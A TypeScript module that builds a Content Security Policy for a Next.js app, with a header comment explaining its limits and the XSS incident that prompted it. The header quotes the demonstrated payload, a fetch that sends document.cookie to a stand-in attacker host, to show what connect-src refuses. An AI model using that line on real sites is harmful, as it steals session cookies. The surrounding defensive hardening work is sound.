/**
 * The Content Security Policy, and an honest account of what it can enforce.
 *
 * ── Why this exists ──
 * A review of the documentation renderer found markdown-authored HTML reaching
 * `dangerouslySetInnerHTML` on a prerendered page. The renderer was fixed at
 * source, but the incident's second finding was that nothing stood behind it:
 * the application shipped no CSP at all, so an injected `<script>` had the run
 * of the origin the dashboard is served from. This is the layer that was
 * missing.
 *
 * ── What it cannot do, and why ──
 * It cannot stop an injected inline `<script>` from executing. That is a
 * property of the stack rather than a preference:
 *
 *  - The App Router streams its RSC payload as an inline
 *    `self.__next_f.push([1,"…"])` script. It is per-page — about 28 KB on the
 *    home page — so there is no hash to pin, and hydration does not happen
 *    without it.
 *  - The alternative is a per-request nonce, which Next can only apply when
 *    Proxy sets it on the request. ADR 0008 records why this deployment has no
 *    Proxy and cannot have one: Next 16 defaults it to the Node runtime and
 *    forbids the `runtime` option there, and `@opennextjs/cloudflare` exits 1
 *    rather than build a Node middleware. There is no configuration satisfying
 *    both.
 *  - Nonces would also force every page dynamic, which would take the
 *    documentation and marketing pages off prerendering.
 *
 * Because a hash or nonce in `script-src` makes browsers *ignore*
 * `'unsafe-inline'`, this is not a spectrum to slide along: either the flight
 * payload is allowed inline or the application does not hydrate.
 *
 * ── What it does do, which is most of the damage ──
 * Injected script still executes; what it can accomplish is what changes. The
 * payload the review actually demonstrated was
 * `fetch("https://evil.example?c=" + document.cookie)`, and `connect-src 'self'`
 * refuses it. So does the `<img>` beacon, under `img-src`. Loading a second
 * stage from an attacker's origin is refused by `script-src`, which names this
 * origin and nothing else; posting the page's data to one is refused by
 * `form-action 'self'`, rewriting every relative URL on the page by
 * `base-uri 'self'`, and the plugin-based vectors by `object-src 'none'`. An
 * injection becomes noisy and local instead of a foothold.
 *
 * ── Why no third party is named anywhere ──
 * Every directive is this origin, a keyword, or a non-network scheme. That is
 * new: while Firebase was the identity provider, the browser ran its SDK, and
 * the policy had to name Google's identity endpoints in `connect-src`, Google's
 * script loader and reCAPTCHA in `script-src`, and the project's own auth domain
 * and reCAPTCHA's badge in `frame-src` — each one an origin an injected script
 * could also use.
 *
 * WorkOS needs none of that, because the browser never talks to WorkOS. Signing
 * in is a top-level *navigation*: a plain link to `GET /api/auth/login`, which
 * answers with a redirect to AuthKit's hosted page, which redirects back to
 * `GET /api/auth/callback`; the code exchange is a call this server makes. CSP
 * governs what a page loads, fetches, frames and submits, not where the
 * top-level window may go, so a policy that names no WorkOS host at all is the
 * correct one rather than an oversight. `docs/adr/0010-workos-as-identity-provider.md`
 * has the flow.
 *
 * One consequence to keep: the way into AuthKit must stay a link (or a
 * `location` assignment), never a `<form>`. `form-action` is applied to every
 * redirect a form submission follows, not only to its `action` — Chrome
 * enforces it that way — so a form posting to the login route would have the
 * hop to AuthKit refused by `form-action 'self'`, silently. The fix for that is
 * the link, not a WorkOS host in `form-action`.
 *
 * Read `experimental.sri` in `next.config.ts` for the one hardening deliberately
 * not taken.
 */

export interface CspOptions {
  /** `next dev` needs allowances a deployment must never be given. */
  isDevelopment: boolean;
}

export function contentSecurityPolicy({ isDevelopment }: CspOptions): string {
  const directives: Record<string, readonly string[]> = {
    // Everything not named below falls here, so a directive nobody thought
    // about fails closed rather than being unrestricted.
    'default-src': ["'self'"],

    // `'unsafe-inline'` is the RSC flight payload — see the header. It is not
    // reachable by an attacker who cannot already inject into the document, and
    // an attacker who can is constrained by every other directive here. No
    // remote host: this application executes no third-party code at all.
    //
    // In development React reconstructs server stacks with `eval`, which is
    // exactly the capability a deployment must not hand out.
    'script-src': ["'self'", "'unsafe-inline'", ...(isDevelopment ? ["'unsafe-eval'"] : [])],

    // Inline styles are a different risk from inline scripts: they cannot call
    // anything, and the exfiltration tricks built on CSS selectors need a
    // request to an attacker's origin, which `img-src` and `connect-src` refuse.
    // Next injects its own `<style>` blocks and Tailwind's layer ordering rides
    // on them, so this is not optional either.
    'style-src': ["'self'", "'unsafe-inline'"],

    // `data:` for the generated brand mark and the QR-shaped inline assets;
    // `blob:` for anything the client composes before showing it. No remote
    // origin: an `<img>` to somewhere else is a beacon whether or not it draws.
    'img-src': ["'self'", 'data:', 'blob:'],

    // `next/font` downloads Geist at build time and serves it from this origin,
    // so there is no font host to allow.
    'font-src': ["'self'"],

    // The one directive that turns a script injection from a breach into a
    // nuisance: with nowhere to send it, stolen data stays on the page. Every
    // request the client makes is to this origin's API.
    'connect-src': ["'self'"],

    // Nothing third-party is framed. Everything else that could host a frame is
    // refused, and `frame-ancestors` below refuses the reverse.
    'frame-src': ["'self'"],

    'object-src': ["'none'"],
    'base-uri': ["'self'"],
    // Also what keeps the way into AuthKit a link — see the header.
    'form-action': ["'self'"],

    // The modern half of `X-Frame-Options: DENY`, which is also set. Both, not
    // either: the header is what older browsers read, this is what current ones
    // read, and clickjacking a secret manager is worth two lines.
    'frame-ancestors': ["'none'"],

    'worker-src': ["'self'", 'blob:'],
    'manifest-src': ["'self'"],
  };

  const rendered = Object.entries(directives).map(
    ([name, sources]) => `${name} ${sources.join(' ')}`,
  );

  // Not in development, where the dev server is plain http on localhost and
  // this would make every asset request unservable.
  if (!isDevelopment) rendered.push('upgrade-insecure-requests');

  return rendered.join('; ');
}
